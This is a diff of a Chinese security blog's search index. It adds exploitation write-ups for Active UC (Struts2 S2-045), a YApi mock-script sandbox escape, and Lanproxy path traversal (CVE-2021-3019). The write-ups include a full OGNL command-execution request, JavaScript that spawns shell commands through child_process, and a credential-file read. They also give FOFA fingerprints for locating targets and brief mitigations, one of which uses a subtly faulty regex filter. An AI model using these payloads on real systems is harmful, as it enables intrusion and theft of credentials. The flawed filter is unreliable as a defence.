-<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
-<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
-<p>注册之后新建项目</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
-<p>添加接口</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
-<p>选择高级mock-脚本-开启脚本</p>
-<p>把以下代码粘贴到脚本中</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
-<p>保存代码并预览</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
-<p>2.升级维护版本（非官方）</p>
-<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
-<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
-<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1996,6 +1893,109 @@
       </categories>
       <tags>
         <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Active UC index.action远程命令执行漏洞</title>
+    <url>//20f03e999316.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
+
+<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
+<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+        <category>Active-UC</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Yapi Mock远程代码执行漏洞</title>
+    <url>//8cd1c56722a1.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
+<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
+<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
+<p>注册之后新建项目</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
+<p>添加接口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
+<p>选择高级mock-脚本-开启脚本</p>
+<p>把以下代码粘贴到脚本中</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
+<p>保存代码并预览</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
+<p>2.升级维护版本（非官方）</p>
+<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
+<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
+<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Lanproxy任意文件读取-CVE-2021-3019</title>
+    <url>//0e7fcf3b35d4.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header&#x3D; &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://file.nioee.com/d/2e81550ebdbd416c933f/">https://file.nioee.com/d/2e81550ebdbd416c933f/</a></p>
+<p>只下载服务端<a href="https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-server-0.1.zip">proxy-server-0.1.zip</a></p>
+<p>配置文件地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;conf&#x2F;config.properties</span><br></pre></td></tr></table></figure>
+
+<p>启动服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;bin&#x2F;startup.bat</span><br><span class="line">..&#x2F;bin&#x2F;startup.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问服务页面管理地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8090</span><br></pre></td></tr></table></figure>
+
+<p>当前页面抓包，访问路径<code>../conf/config.properties</code>(直接访问会报404错)</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5vkomujlj611f0badlf02.jpg" alt="Lanproxy目录遍历漏洞.png"></p>
+<h3 id="POC下载"><a href="#POC下载" class="headerlink" title="POC下载"></a>POC下载</h3><p><a href="https://github.com/FanqXu/CVE-2021-3019">https://github.com/FanqXu/CVE-2021-3019</a></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载官方补丁</p>
+<p><a href="https://github.com/ffay/lanproxy/commits/master">https://github.com/ffay/lanproxy/commits/master</a></p>
+<p><a href="https://github.com/hailinz/lanproxy">https://github.com/hailinz/lanproxy</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+        <category>Lanproxy</category>
+      </categories>
+      <tags>
+        <tag>信息泄露</tag>
+        <tag>目录遍历</tag>
       </tags>
   </entry>
   <entry>
